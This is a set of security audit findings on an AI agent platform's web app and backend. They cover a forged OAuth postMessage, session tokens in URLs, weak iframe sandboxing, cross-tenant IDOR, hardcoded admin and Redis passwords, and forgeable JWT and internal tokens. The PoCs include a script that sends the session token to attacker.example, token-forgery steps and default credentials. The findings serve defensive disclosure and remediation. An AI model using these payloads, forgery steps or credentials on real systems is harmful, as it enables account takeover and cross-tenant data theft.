title: Missing origin and state validation on OAuth postMessage handler in ConnectorPanel
description: The OAuth callback message listener in the SPA accepts any 'oauth-callback' postMessage without validating event.origin or a state nonce, so any window holding a reference to the SPA can deliver a forged callback and bind the victim's connector to an attacker-chosen credentialId.
impact: An attacker page that holds a window reference to the SPA (e.g. an opener, or an adjacent attacker-controlled page) can send a forged `{type:'oauth-callback', payload:{success:true, credentialId:<attacker value>}}` message while a victim initiates a connector OAuth flow. The victim's connector is then configured with the attacker's credentialId, so subsequent agent actions using that connector authenticate with attacker-controlled credentials — a credential-confusion outcome where the attacker acts under the victim's context or observes traffic routed through their credential.
technical_analysis: `ConnectorPanel.tsx` starts an OAuth popup and registers a global `message` listener (`frontend/src/components/ConnectorPanel.tsx:264-275`). The handler filters only on `event.data?.type === 'oauth-callback'` and then destructures `success`, `error`, and `credentialId` from `event.data.payload`, storing `credentialId` via `setOauthCredentialId`. There is no `event.origin` check, no `event.source` check, and no state/nonce correlation with the OAuth request, so the listener trusts any origin that can dispatch a message to the window. The registered credentialId is later used as the credential binding for the connector, so a forged message during the authorization window swaps the binding.
poc_description:
1. As a victim, open the SPA and start a connector OAuth authorization (opens the popup).
2. From a window holding a reference to the SPA (e.g. its opener or an attacker page that window.open'ed it), dispatch `window.postMessage({type:'oauth-callback', payload:{success:true, credentialId:'attacker-controlled-id'}}, '*')` while the flow is pending.
3. The SPA removes the listener and sets the connector credentialId to the attacker-supplied value with no origin check, as shown in ConnectorPanel.tsx:264-275.
remediation_steps: Validate `event.origin` against the expected API/popup origin and verify a per-flow state nonce echoed in the message payload (generate a random state before opening the popup, require it in the callback, and reject mismatches). Also confirm `event.source` is the expected popup window.
evidence: Code at frontend/src/components/ConnectorPanel.tsx:264-275 shows `const onMessage = (event: MessageEvent) => { if (event.data?.type !== 'oauth-callback') return; ... const { success, error: oauthError, credentialId } = event.data.payload; if (success && credentialId) { setOauthCredentialId(credentialId) } }` with no reference to event.origin, event.source, or any state/nonce comparison.
assumptions: Requires a window holding a script-accessible reference to the SPA (opener, embedded attacker-controlled page, or same-origin neighbor) to fire during the OAuth authorization window. No live deployment was available to confirm the attacker-reachable window in production; this is a code-trace finding validated locally by inspection only.
counterevidence: The handler gates on event.data?.type === 'oauth-callback', so unsolicited cross-origin messages with other types are ignored, and it is registered only while an OAuth popup flow is in flight and removed on first match — shrinking the attack window to the authorization period. The payload only sets a connector credentialId in local component state; no direct script execution or data exfiltration occurs from the message itself. No other postMessage listener accepting this message type was found.
confidence_rationale: Validated by complete static trace of the listener and its data flow; no live deployment or browser-based reproduction was performed, so exploit timing (attacker-reachable reference during the OAuth window) is reasoned rather than demonstrated.
severity_change_conditions: Confirmation that third-party pages can routinely obtain a window reference to the SPA (e.g. via the OAuth popup opener relationship or embedded content) would raise this to high; confirmation that credentialId values are strictly server-issued and re-validated server-side before use would lower it.

title: Session token passed in URL query string across preview endpoints
description: The SPA appends the user's full authentication token as a `?token=` query parameter on preview, PDF, published-app, and static-asset URLs, and the backend explicitly accepts query-string tokens. Session tokens therefore leak into browser history, proxy/server access logs, and Referer headers.
impact: The user's session token (Cognito ID token or local auth token) is embedded in URLs that are stored in browser history, recorded in web-server and proxy access logs, and can be leaked via Referer headers if such a URL is embedded on a third-party page. Anyone with access to those channels obtains the victim's full session token and can act as the victim against the API until token expiry. No confidentiality/integrity impact is demonstrated without log/history access — this is a token-exposure weakness.
technical_analysis: Multiple frontend components build resource URLs embedding the raw session token read from localStorage (`local_auth_token` or `cognito_id_token`): dev-server and workspace-file previews (`frontend/src/pages/Chat.tsx:527`), the PublishedAppPreviewTab full URL also opened in a new tab via `window.open` (`frontend/src/pages/Chat.tsx:617-634`), PDF raw-file iframes (`frontend/src/pages/Chat.tsx:296-304`), the project-board preview-ready handler (`frontend/src/pages/ProjectBoard.tsx:190-197`), and published-app static links (`frontend/src/components/WorkspaceActions.tsx:179-184`). On the backend, `authenticate()` in `backend/src/middleware/auth.ts:150-157` accepts `request.query.token` as an alternative to the Authorization header, making the query string an authentication channel. Query strings are logged by proxies/servers and stored in browser history, and are sent in Referer headers when the resource URL is embedded elsewhere.
poc_description:
1. Open a chat session with a workspace file preview, a published app, or a PDF file in the SPA.
2. Observe the iframe/img URL, e.g. `${baseUrl}/api/apps/<id>/static/index.html?token=<full JWT>` at WorkspaceActions.tsx:179-184, or the preview URL at Chat.tsx:527/617.
3. Open the browser history for the session — the full token is recorded in the URL.
4. Send the same request with the extracted `?token=` value and no Authorization header — `backend/src/middleware/auth.ts:150-157` accepts it as authentication, proving the URL-carried token is a usable session credential.
poc_script_code:
# After a preview renders, the token is recoverable from history/logs:
# e.g. logged URL: http://<api>/api/apps/<id>/static/index.html?token=eyJhbGciOi...
# Replay without header:
curl "http://<api>/api/apps/<id>/static/index.html?token=<extracted-token>" -i
# -> HTTP 200 (authenticated), because auth.ts:150-157 uses query token
remediation_steps: Replace query-string tokens with short-lived, single-purpose, HttpOnly-cookie or one-time preview tickets minted for the specific resource URL (e.g. signed download URLs with expiry), and remove `?token=` acceptance from the backend middleware. Where iframe rendering is unavoidable, use a POST-issued temporary cookie or a per-session preview token distinct from the primary session token.
evidence: Confirmed construction sites: `frontend/src/pages/Chat.tsx:527` (`...&token=${encodeURIComponent(token)}` for dev-server/file previews), `frontend/src/pages/Chat.tsx:617` (PublishedAppPreviewTab `fullUrl` with `?token=`), `frontend/src/pages/Chat.tsx:634` (`window.open(fullUrl)`), `frontend/src/pages/ProjectBoard.tsx:190-197` (preview-ready handler appending `?token=`), `frontend/src/components/WorkspaceActions.tsx:179-184` (published-app static URL with `?token=`). Backend acceptance: `backend/src/middleware/auth.ts:150-157` reads `request.query.token` and uses it as the bearer token when no Authorization header is present.
assumptions: Attacker must obtain the token from browser history, proxy/server access logs, or Referer leakage; the finding is a code-trace validated locally with no live deployment, so production log retention and Referer exposure are unverified. Tokens here are the SPA's auth tokens read from localStorage (local_auth_token or cognito_id_token).
counterevidence: Tokens are URL-encoded, and most of these URLs target same-origin API endpoints, limiting passive Referer leakage to cases where the API origin is embedded by third parties (not observed here). The query-token path exists to support iframe/browser-native viewers that cannot set Authorization headers — a functional requirement, not an oversight alone. Backend still validates the token (auth.ts rejects missing/invalid tokens), so exposure requires capture of the URL, not just discovery of the endpoint. No evidence was found that tokens are logged by the backend itself; the leak channels are browser history, intermediary proxies, and Referer headers.
confidence_rationale: Complete static trace of every token-in-URL construction plus the backend middleware that accepts ?token=; impact depends on log/history/Referer access that was not demonstrable in the local-only assessment.
severity_change_conditions: Confirmation that production fronting infrastructure (CDN, load balancer, API gateway) logs full query strings would raise severity to high; a short token TTL and per-resource single-use preview tokens would lower it.

title: Preview iframes combine allow-scripts with allow-same-origin, nullifying sandbox isolation
description: Agent-output and published-app preview iframes use sandbox="allow-scripts allow-same-origin allow-forms allow-popups". For content served from the SPA/API origin this combination nullifies the sandbox: framed scripts run with full same-origin privileges and can read the parent's localStorage session tokens, which are also handed to the frame via ?token=.
impact: A user-authored published app or agent-generated HTML/JS file previewed in one of these iframes executes script in the API/SPA origin (when co-hosted). It can read `localStorage.local_auth_token` / `cognito_id_token` of the victim — including via the token already present in its own URL — and exfiltrate the victim's session, or issue credentialed API requests. Any agent-authored content (which can incorporate untrusted instructions from knowledge-base files or prompt injection) becomes a same-origin script execution vector.
technical_analysis: Three preview iframes — the dev-server/file preview (`frontend/src/pages/Chat.tsx:596-600`), the PublishedAppPreviewTab (`frontend/src/pages/Chat.tsx:642-647`), and the published-app runner (`frontend/src/pages/AppRunner.tsx:160`) — set `sandbox="allow-scripts allow-same-origin allow-forms allow-popups"`. When sandboxed content is same-origin with its embedder, `allow-same-origin` plus `allow-scripts` lets the framed document remove its own sandbox attribute or simply script the parent (it is not cross-origin), accessing `parent.localStorage` where `local_auth_token`/`cognito_id_token` are stored. The frames load API-origin URLs that also carry the session token in the query string (Chat.tsx:527/617, AppRunner.tsx:140), so even without parent access the frame's own location exposes the token to its scripts. The framed content (user-published apps, agent-generated HTML workspace files) is attacker-controllable by a tenant author or via agent output influenced by knowledge-base/prompt content.
poc_description:
1. Publish an app whose static content includes `fetch('/api/...', ...)` or `localStorage.getItem('local_auth_token')`, or place a workspace HTML file with such script and open its preview.
2. The preview loads in the iframe at Chat.tsx:600/646 or AppRunner.tsx:160 with `allow-scripts allow-same-origin`.
3. Because the frame content is same-origin with the token-carrying API (and the token is in the frame URL), the script reads the session token or performs authenticated API calls directly from within the frame.
poc_script_code:
<!-- content of a published app / workspace file rendered in one of the iframes -->
<script>
  // token is directly readable from this frame's own URL (AppRunner.tsx:140, Chat.tsx:617)
  const t = new URLSearchParams(location.search).get('token');
  // and, if SPA/API co-hosted, from parent storage:
  try { const lt = parent.localStorage.getItem('local_auth_token'); } catch (e) {}
  navigator.sendBeacon('https://attacker.example/', t || lt);
</script>
remediation_steps: Serve previewed app/file content from a dedicated origin (separate subdomain) and drop `allow-same-origin` from the sandbox attribute, keeping `allow-scripts allow-forms`. Replace URL tokens with per-resource signed preview URLs or a scoped cookie, so the frame never receives or inherits the primary session token.
evidence: Verified sandbox attributes at `frontend/src/pages/Chat.tsx:600` (dev-server preview), `frontend/src/pages/Chat.tsx:646` (PublishedAppPreviewTab), and `frontend/src/pages/AppRunner.tsx:160` (published app runner): all read `sandbox="allow-scripts allow-same-origin allow-forms allow-popups"`. Each frame's src is an API-origin URL that includes `?token=<session token>` (Chat.tsx:527, 617; AppRunner.tsx:140).
assumptions: Impact depends on deployment topology: the framed URLs target the API origin (VITE_API_BASE_URL) and the token URL param is only exposed to the frame if the SPA and API are same-origin or the token is otherwise in the frame's URL. Same-origin co-hosting of SPA and API is inferred (default localhost:3000) but unconfirmed for production; no live deployment was available for validation.
counterevidence: The sandbox attribute does omit `allow-top-navigation`, so framed content cannot navigate the top-level SPA away; the PDF iframe at Chat.tsx:125 uses sandbox="allow-scripts" without allow-same-origin, which is correctly hardened. If the SPA and API are on different origins in production, allow-same-origin grants no access to SPA storage and the practical impact reduces to the token-in-URL finding already reported separately. The framed content (published apps, agent-generated HTML/JS) is created by the platform itself, so an attacker must first get malicious content served from the API origin via an app/file they control.
confidence_rationale: Static trace confirms the sandbox attribute combination and that framed URLs carry the session token; the escalation to token theft additionally depends on the unconfirmed same-origin deployment topology, which is why this is not high confidence.
severity_change_conditions: Confirmation that the SPA and API are served same-origin in production (or that the token in the frame URL is the primary session token, which is already confirmed) raises this to high; a separate preview origin with no token in URLs would reduce it to low.

title: Cross-organization IDOR on knowledge-base, briefing, and scope plugin/MCP-server routes (missing organization_id scoping)
description: Knowledge-base, briefing, and business-scope plugin/MCP-server routes in the backend Fastify API perform object lookups solely by primary-key identifier with no organization scoping. Any authenticated user of any tenant can read, modify, or soft-delete another organization's knowledge bases, files, folders, and briefings by supplying the target object's UUID.
impact: Cross-tenant (cross-organization) read, modification, and deletion of tenant data: full knowledge-base metadata, file listings and metadata, and scope briefings of any organization; soft-deleting or renaming another org's knowledge bases; mutating their files. This breaks the multi-tenant isolation boundary of the platform for an entire resource family.
technical_analysis: `knowledge-base.routes.ts` guards every route only with `authenticate` / `requireModifyAccess` (the latter is `requireRole('owner','admin','member')` — a role check, not a tenant check). The handlers pass the raw `request.params.id` / `:fileId` / `:folderId` straight into `knowledgeBaseService`, whose queries contain no `organization_id` predicate: `findById` (knowledge-base.service.ts:69 — `prisma.knowledge_bases.findUnique({ where: { id } })`), `update` (:80), `delete` (:91 — soft-delete by id only), `listFiles` (:224, filters only on knowledge_base_id/folder/tags/search), `updateFile` (:277), `deleteFile` (:294), plus `renameFolder`/`deleteFolder` by folderId. `briefing.routes.ts:24-118` queries `prisma.scope_briefings` filtering only on `business_scope_id` (GET list, PATCH read, DELETE archive, stats) with no verification that the scope belongs to the caller's organization. In `businessScopes.routes.ts`, GET `/:id/plugins` (:821) runs raw SQL `WHERE sp.business_scope_id = ${id}` — it even computes `const orgId = request.user!.orgId` but never uses it — and GET `/:id/mcp-servers` (:940) joins `scope_mcp_servers`/`mcp_servers` scoped only by the scope id, disclosing other tenants' plugin git URLs and MCP server host addresses/config.
poc_description: 1. Authenticate as a low-privilege user of organization A (any role ≥ member). 2. Issue GET /api/knowledge-bases/:id with a knowledge-base UUID belonging to organization B — the full record of org B's KB is returned. 3. Issue PUT/DELETE on the same ID — org B's KB is renamed/soft-deleted. 4. Issue GET /api/knowledge-bases/:id/files and DELETE /:id/files/:fileId to list and delete org B's files. 5. Issue GET /api/business-scopes/:scopeId/briefings with org B's scope ID to read org B briefings, and PATCH/DELETE to alter their read/archived state. 6. Same with GET /api/business-scopes/:id/plugins and /:id/mcp-servers. No 403/404 boundary is hit because the filters never compare organization_id.
poc_script_code:
```
# PoC (unit-level, mirrors the live request shapes)
# Run: cd super-agent/backend && npx vitest run tests/unit/kb-idor.poc.test.ts
# The test boots the real knowledge-base/briefing routes with a faithful
# in-memory Prisma store and proves, for an org-A requester:
GET    /api/knowledge-bases/cccccccc-...          -> 200, org B KB record
PUT    /api/knowledge-bases/cccccccc-...          -> 200, renamed org B KB
DELETE /api/knowledge-bases/cccccccc-...         -> 204, status='deleted'
GET    /api/knowledge-bases/cccccccc-.../files   -> 200, SECRET-MARKER file
DELETE /api/knowledge-bases/cccccccc-.../files/:id -> 204
GET    /api/business-scopes/bbbb.../briefings   -> 200, SECRET-BRIEFING
```
remediation_steps: Add an organization scoping predicate to every object lookup on these route families. For the knowledge-base service, change `findById`, `update`, `delete`, `listFiles`, `updateFile`, `deleteFile`, `renameFolder`, `deleteFolder`, and the batch operations to accept and filter on `organization_id` (e.g. `findUnique` → `findFirst({ where: { id, organization_id } })`), and pass `request.user.orgId` from every route handler. For briefing and business-scope routes, first resolve the business scope by `id` AND `organization_id`, returning 404 when it is not the caller's tenant, before querying or mutating child resources (briefings, plugins, mcp-servers). Do not rely on role checks (`requireModifyAccess`) as a tenant boundary.
evidence: Local unit PoC (`backend/tests/unit/kb-idor.poc.test.ts`): two orgs A and B instantiated in an in-memory store; requester is a member of org A; org B's KB, file, and briefing records are returned/modified by every route above (GET /:id returns org B's KB including description; PUT /:id renames it; DELETE sets status='deleted'; GET /:id/files returns the SECRET-MARKER file; DELETE /:id/files/:fileId removes it; GET /api/business-scopes/:scopeId/briefings returns org B's SECRET-BRIEFING record). All pass because the production `where` clauses never reference organization_id.
assumptions: Authenticated user of any tenant (role `member` or above) with knowledge of or guessed object UUIDs. Production deployment exposure and route prefix registration were not tested against a live server; validation is via local unit PoC against the real route/service code with an in-memory store faithful to the Prisma `where` semantics.
counterevidence: Checked for guards that would close this: (1) route-level `preHandler` arrays on all affected routes contain only `authenticate` / `requireModifyAccess` — the latter is purely role-based (`requireRole('owner','admin','member')`) and contains no org check; (2) the `backend/authorization/` layer (`requirePermission`, `authorizationService.authorize`) is NOT referenced on any of these routes; (3) the service layer applies no organization filter at the cited lines; (4) briefing routes query Prisma with only `business_scope_id`, and scope ownership is never resolved to an org. No compensating control found on any of these paths.
confidence_rationale: Complete source trace of routes and service layer showing the missing organization filter on every cited line, plus a local unit PoC against the real route handlers demonstrating cross-org read/write/delete of org B data by an org A user. Not exercised against a live deployment.
severity_change_conditions: Evidence that the deployment is effectively single-tenant would lower severity to medium; confirmation of internet-facing multi-tenant deployment is already assumed for this rating.

title: Hardcoded default admin password 'Admin1234!' seeded and logged by deployment scripts
description: The deployment scripts seed a default administrator account (admin@example.com / Admin1234!) on every fresh deployment, never force a password change, and echo the plaintext credential into deployment logs. Because the credential is also published in the repository's deployment documentation, anyone who can reach a deployment's login endpoint can gain full admin access on any instance where the operator did not manually change the password.
impact: Full administrative takeover of any deployment provisioned by these scripts where the default was not changed: the admin account can read and modify all tenant data, agents, workflows, and platform configuration via the backend API. Deploy-log readers (CI artifacts, SSH session transcripts) obtain the credential even if the operator never read the docs.
technical_analysis: Both deployment entry points converge on the same behavior. `infra/scripts/ci/remote-deploy.sh` (commented "runs on EC2 via CI/CD pipeline", i.e. the CI/CD path) and `infra/scripts/deploy.sh:418-421` (the unified deploy script, also invoked by `infra/scripts/deploy-full.sh:198`) run `prisma/seed.ts` on a fresh database, which creates the `admin@example.com` profile, then execute `UPDATE profiles SET password_hash = '<bcrypt("Admin1234!")>' WHERE username = 'admin@example.com' AND password_hash IS NULL`. There is no randomization, no forced first-login rotation, and no expiry: any deployment seeded by these scripts keeps the known password until an operator manually changes it. The scripts additionally print the plaintext credential to stdout (`echo "Admin login: admin@example.com / Admin1234!"`), which lands in CI logs and terminal transcripts. The credential is hardcoded in a public-style repository and repeated in `infra/README.md` and `document/fork-deploy-guide.md`, so it is known to anyone who has ever read the docs. The only mitigating condition is the `AND password_hash IS NULL` guard, which limits the overwrite to fresh deployments but does nothing to prevent the default being left in place.
poc_description:
1. Deploy the stack via infra/scripts/deploy.sh or the CI remote-deploy path — the seed creates the `admin@example.com` profile.
2. Observe the deployment log line `Admin login: admin@example.com / Admin1234!` (remote-deploy.sh, echoed to stdout/CI logs).
3. On the deployed instance, log in with these credentials via the local-auth login endpoint.
4. The same credential is documented in infra/README.md:87 and document/fork-deploy-guide.md:274, so it is known to anyone with repository access without reading any logs.
poc_script_code:
```bash
# Verified in source: infra/scripts/ci/remote-deploy.sh (seed block) and
# infra/scripts/deploy.sh:418-421 set the bcrypt hash of "Admin1234!" for
# admin@example.com whenever password_hash IS NULL, then echo the plaintext:
#   echo "Admin login: admin@example.com / Admin1234!"
# Documented publicly in infra/README.md:87 and document/fork-deploy-guide.md:274.
# Against any deployed instance built by these scripts where the password
# was not rotated:
#   POST /api/auth/login  {"username":"admin@example.com","password":"Admin1234!"}
# returns an admin session. Not executed here (local-only assessment).
```
remediation_steps: Generate a random admin password per deployment and deliver it through a secure channel (or require first-boot rotation), never echo credentials to logs, and do not publish default credentials in documentation. Block authentication on the seeded admin account until the password is changed.
evidence:
infra/scripts/ci/remote-deploy.sh:
```
ADMIN_HASH=$(node -e 'require("bcryptjs").hash("Admin1234!", 10).then(h => process.stdout.write(h))')
psql "$PSQL_URL" -c "UPDATE profiles SET password_hash = '${ADMIN_HASH}' WHERE username = 'admin@example.com' AND password_hash IS NULL;"
echo "Admin login: admin@example.com / Admin1234!"
```
Same block (with `sudo` prefixes) at infra/scripts/deploy.sh:418-421. Credential also in infra/README.md:87 and document/fork-deploy-guide.md:274. Seed admin user created at backend/prisma/seed.ts:56.
assumptions: Assumes a deployment where the seeded admin account is reachable (AUTH_MODE=local or local login enabled) and the operator did not change the default password — the script never forces a change and only sets the hash when NULL. Assumes this deployment path is used for internet-reachable instances; an operator who immediately rotates the password reduces this to defense-in-depth.
counterevidence: The password is only set when `password_hash IS NULL` (first boot of a fresh deployment), so environments where an operator completed a password change or where Cognito mode is used exclusively are unaffected. The seed admin may be documented as a bootstrap-only account. However, no forced rotation, expiry, or login-restriction mechanism exists anywhere in the cited scripts, and the credential is echoed verbatim into deployment logs, so the default persists on any unattended deployment.
confidence_rationale: Static trace fully verified in source, but no live deployment was available to confirm the admin account with the default password is internet-reachable on a production instance (local-only assessment mandate).
severity_change_conditions: Confirmation that these scripts are the actual production/CI deploy path for an internet-reachable instance (rather than a fork/dev helper) would raise confidence to high; evidence that all deployments use Cognito-only auth with local login disabled would lower severity to medium/low.

title: Authentication forgery family: internal-token HMAC key publicly disclosed, default JWT secret, and query-parameter token acceptance
description: The backend's authentication middleware (middleware/auth.ts) can be satisfied by three separately forgeable token classes: (a) JWTs signed with the hard-coded default secret `super-agent-local-dev-secret-change-in-production` that config applies whenever JWT_SECRET is unset in local auth mode; (b) "internal service tokens" whose HMAC key in Cognito mode is derived from the Cognito userPoolId — a value the backend itself discloses unauthenticated at GET /api/auth/config; (c) JWTs passed as a `?token=` query parameter on any route, which leak into logs, referrers, and proxy histories. Each allows impersonating any user, role, and organization.
impact: Complete authentication bypass. In Cognito production mode the internal-token path lets an anonymous attacker who fetched /api/auth/config forge a token for any user id, any role (including `owner`), and any organization, bypassing even the profile-existence check that normal tokens undergo. In local mode (or wherever JWT_SECRET is unset) the default secret allows forging arbitrary local JWTs. Query-param tokens additionally expose valid credentials in URLs. Consequence is full cross-tenant account and privilege impersonation across the API.
technical_analysis: Three interacting weaknesses in `middleware/auth.ts` and `config/index.ts`. (a) `config/index.ts:30` defaults `JWT_SECRET` to the hard-coded string `super-agent-local-dev-secret-change-in-production`; `verifyLocalToken` (auth.ts:66-78) verifies any JWT against `config.jwtSecret`, so when the env var is unset every forged local JWT is valid. (b) `INTERNAL_TOKEN_SECRET` (auth.ts:81-83) is `config.cognito.userPoolId` in Cognito mode; `createToken`/`verifyInternalToken` (auth.ts:86-126) HMAC-sign/verify internal tokens with it. `auth.routes.ts:30-40` exposes `GET /api/auth/config` with no authentication, returning `userPoolId` (and clientId, region, domain) — so any anonymous caller can mint a valid internal token for arbitrary `sub`/`orgId`/`role` claims. Critically, the internal-token branch in `authenticate` (auth.ts:170-179) returns immediately with the forged claims and skips the `profiles.findUnique` lookup that normal tokens undergo — no victim account even needs to exist. (c) `authenticate` (auth.ts:129-157) accepts the JWT from `?token=` in the query string on every route ("for iframe/img src"), placing bearer credentials in URLs where they leak via logs, Referer headers, and intermediary caches.
poc_description: 1. (b) Send GET /api/auth/config unauthenticated; response includes `userPoolId`. 2. Build payload `internal.<base64url({"sub":"<victim-user-id>","email":"x@y","orgId":"<victim-org>","role":"owner","exp":<now+3600>})>.<HMAC-SHA256(data, userPoolId) base64url>` — this is exactly `createToken()` in auth.ts. 3. Send any API request with `Authorization: Bearer internal...` — authenticate() verifies the HMAC against the same userPoolId, sets request.user from the payload, and returns before any profile/membership lookup. 4. (a) With JWT_SECRET unset (local mode), sign a jsonwebtoken JWT with the default secret and arbitrary sub/orgId/role claims; it verifies via verifyLocalToken. 5. (c) Send either token as `?token=` on any route — authenticate() accepts it from the query string.
poc_script_code:
```
# Unit PoC: cd super-agent/backend && npx vitest run tests/unit/auth-forgery.poc.test.ts
# Exercises the REAL src/middleware/auth.ts. Demonstrates:
#  1. config.jwtSecret === 'super-agent-local-dev-secret-change-in-production' when env unset
#  2. jwt.sign({sub: victim, role: 'owner', orgId: attacker-choice}, DEFAULT_SECRET) -> 200, req.user.role='owner'
#  3. internal.<b64(payload)>.<hmac(payload, userPoolId)> -> 200, req.user set, no profile lookup
#  4. same tokens via ?token= query param -> accepted
```
remediation_steps: (1) Give internal service tokens their own high-entropy secret (dedicated environment variable), never derive them from the public userPoolId, and restrict their acceptance to a private network path or an explicit allowlist of internal callers; consider a dedicated Fastify plugin/prefix only reachable internally. (2) Remove the default JWT_SECRET from the zod schema and fail startup when AUTH_MODE=local and JWT_SECRET is missing in non-development environments. (3) Remove query-parameter token acceptance in authenticate(); if iframe/img use cases need it, restrict it to a narrow, explicit allowlist of read-only routes and short-lived tokens, and ensure tokens never appear in logs.
evidence: Local unit PoC `backend/tests/unit/auth-forgery.poc.test.ts` runs the real `authenticate()` from src/middleware/auth.ts with mocked prisma: (1) with JWT_SECRET deleted from the environment, `config.jwtSecret` equals the hard-coded default; (2) a JWT signed with that public default secret and claims of a victim user id / `role: 'owner'` authenticates with `req.user.role === 'owner'` and the attacker-chosen orgId; (3) an `internal.`-format token HMAC-signed with the userPoolId string authenticates without any profile existing in the database; (4) the same forgery succeeds when the token is supplied only as `?token=` query parameter.
assumptions: Mechanisms (a) and (c) apply in local auth mode (AUTH_MODE=local, default per config schema) or any deployment where JWT_SECRET is unset. Mechanism (b) applies in production Cognito mode: requires only knowledge of the userPoolId, which the backend itself publishes at GET /api/auth/config without authentication. All paths require network reachability of the API, which is unverified for production (local-only validation).
counterevidence: Actively checked for guards: (1) the authenticate hook performs no separate validation of internal tokens beyond the HMAC — the internal-token branch returns before any profile/membership lookup (auth.ts:170-179), so the profile-existence check that protects Cognito/local JWT paths does not apply; (2) there is no allowlist of callers (e.g. no loopback/private-network check or mutual TLS) on internal tokens; (3) query-token acceptance is not restricted to any path, method, or content-type allowlist; (4) no startup check anywhere enforces that JWT_SECRET is set when AUTH_MODE=local in production (the zod schema silently defaults it). The only mitigating facts are deployment-mode preconditions, noted in assumptions; the default-secret path is only exploitable where JWT_SECRET is unset, and the internal-token path is only exploitable where an attacker can read /api/auth/config and reach the API.
confidence_rationale: Every mechanism is a complete, line-cited source trace, and the local unit PoC (backend/tests/unit/auth-forgery.poc.test.ts) forges tokens that pass the real authenticate() middleware. Production exposure of these routes was not tested against a live deployment (out of scope for this assessment), which is the only gap.
severity_change_conditions: Confirmation that the API is internet-exposed in Cognito mode would keep this at critical; evidence that /api/auth/config is blocked at a gateway and internal tokens are accepted only from a private network would lower it to high.

title: Hardcoded Redis password and unset deployment secrets (REDIS_PASSWORD/JWT_SECRET) in provisioning scripts
description: The infrastructure provisioning sets a hardcoded, repository-published Redis password on the EC2 host Redis, while both deployment env-generation paths emit an empty REDIS_PASSWORD for the backend. The CI env template also omits JWT_SECRET, letting the backend fall back to its hardcoded default signing secret. Together these leave the job-queue/cache layer open to anyone who can reach Redis and leave JWTs forgeable on CI-provisioned deployments.
impact: On deployments where local Redis is the active host (the documented ElastiCache fallback), an attacker who can reach port 6379 authenticates with the public 'super-agent-redis-password' and gains read/write access to BullMQ job queues and cached data, including injecting or manipulating queued jobs (agent runs, async work). On CI-provisioned deployments where merge-env.sh does not inject a JWT_SECRET, the backend signs and verifies JWTs with the repository-public default, allowing token forgery. The local docker-compose dev environment (JWT_SECRET 'local-dev-jwt-secret-change-in-production', postgres:postgres, published 5432/6379) is the same root cause at dev severity.
technical_analysis:
Redis: `infra/scripts/user-data.sh:73-74` runs on EC2 boot and sets the host Redis `requirepass` to the literal `super-agent-redis-password`, which is committed to the repository and therefore public to anyone who reads it. The comment at user-data.sh:71-72 documents that this local Redis is the fallback when ElastiCache is not configured — i.e. it is a real runtime component on at least some deployments. Meanwhile no provisioning path gives the backend a matching secret: `infra/scripts/ci/gen-base-env.py:25` writes `REDIS_PASSWORD=` (empty) even with `NODE_ENV=production`, and `infra/scripts/deploy.sh:213` writes `REDIS_PASSWORD=${REDIS_ENDPOINT:+}` — also empty whether or not ElastiCache is present. So the backend cannot authenticate to the host Redis it is expected to use in fallback mode, and any attacker who can reach the instance's port 6379 authenticates with the public password and can read/mutate BullMQ queues and caches.

JWT: `backend/src/config/index.ts:30` makes `JWT_SECRET` optional with default `'super-agent-local-dev-secret-change-in-production'`, and `:145` gives `INSFORGE_JWT_SECRET` a default of `'spike-test-secret-key-must-be-32-chars-long'`. The interactive `deploy.sh:239` generates a random JWT_SECRET, but only in non-Cognito mode, and `infra/scripts/ci/merge-env.sh:9` appends a random one — yet `infra/scripts/ci/gen-base-env.py`, the base template the CI pipeline builds on, emits no JWT_SECRET at all and `user-data.sh:241` seeds `JWT_SECRET=CHANGE_ME`. On a CI-provisioned host where merge-env.sh is not invoked or where the placeholder survives, the backend runs in production NODE_ENV signing and verifying JWTs with a repository-public string, making all local-auth tokens forgeable (this is the infra-side deployment path for the backend default-JWT-secret weakness; the backend default itself is being reported separately by the auth agent).

The backend `docker-compose.yml` (JWT_SECRET `local-dev-jwt-secret-change-in-production`, `postgres:postgres` published on 5432, unauthenticated Redis published on 6379) is the same root cause — weak/published secret defaults shipped in configuration — at local-development severity, and is merged into this report rather than filed separately.
poc_description:
1. Inspect infra/scripts/user-data.sh:73-74 — Redis requirepass is set to the literal 'super-agent-redis-password', committed to the repository.
2. Inspect infra/scripts/ci/gen-base-env.py:25 (REDIS_PASSWORD empty) and infra/scripts/deploy.sh:213 (REDIS_PASSWORD set to empty regardless of endpoint) — no path ever populates the backend Redis password.
3. Confirm backend/src/config/index.ts:30 — absent JWT_SECRET falls back to the hardcoded 'super-agent-local-dev-secret-change-in-production'; gen-base-env.py emits no JWT_SECRET and merge-env.sh only appends one if invoked.
4. On a deployment using local Redis: `redis-cli -h <host> -p 6379 -a super-agent-redis-password ping` authenticates; queue and cache keys are then readable/writable (not executed; local-only assessment).
poc_script_code:
```bash
# Static verification (executed against the local checkout):
#   grep -n 'requirepass super-agent-redis-password' infra/scripts/user-data.sh
#     73/74: hardcoded Redis password installed on the EC2 host.
#   grep -n 'REDIS_PASSWORD=' infra/scripts/ci/gen-base-env.py
#     25: 'REDIS_PASSWORD='  (empty value shipped to production NODE_ENV).
#   grep -n 'REDIS_PASSWORD=' infra/scripts/deploy.sh
#     213: REDIS_PASSWORD=${REDIS_ENDPOINT:+}  (empty).
#   sed -n '30p' backend/src/config/index.ts
#     JWT_SECRET default 'super-agent-local-dev-secret-change-in-production'.
# Exploitation against a deployment (NOT executed, local-only mandate):
#   redis-cli -h <ec2-host> -p 6379 -a super-agent-redis-password ping  # -> PONG
```
remediation_steps: Generate the Redis password at provisioning time (e.g. openssl rand) and inject it into both redis.conf and the backend .env from the same secret, never commit a literal password. Set REDIS_PASSWORD in gen-base-env.py from a secret store, set JWT_SECRET unconditionally (removing the backend's hardcoded default fallback), and bind Redis to 127.0.0.1 / firewall the port. Replace the docker-compose development defaults with clearly-named throwaway secrets and avoid publishing service ports to the host.
evidence:
infra/scripts/user-data.sh:73-74:
```
sed -i 's/^# requirepass .*/requirepass super-agent-redis-password/' /etc/redis/redis.conf
sed -i 's/^requirepass .*/requirepass super-agent-redis-password/' /etc/redis/redis.conf
```
infra/scripts/ci/gen-base-env.py:25: `REDIS_PASSWORD=` (empty). infra/scripts/deploy.sh:213: `REDIS_PASSWORD=${REDIS_ENDPOINT:+}` (empty). backend/src/config/index.ts:30: JWT_SECRET default `'super-agent-local-dev-secret-change-in-production'`. backend/src/config/index.ts:145: INSFORGE_JWT_SECRET default `'spike-test-secret-key-must-be-32-chars-long'`.
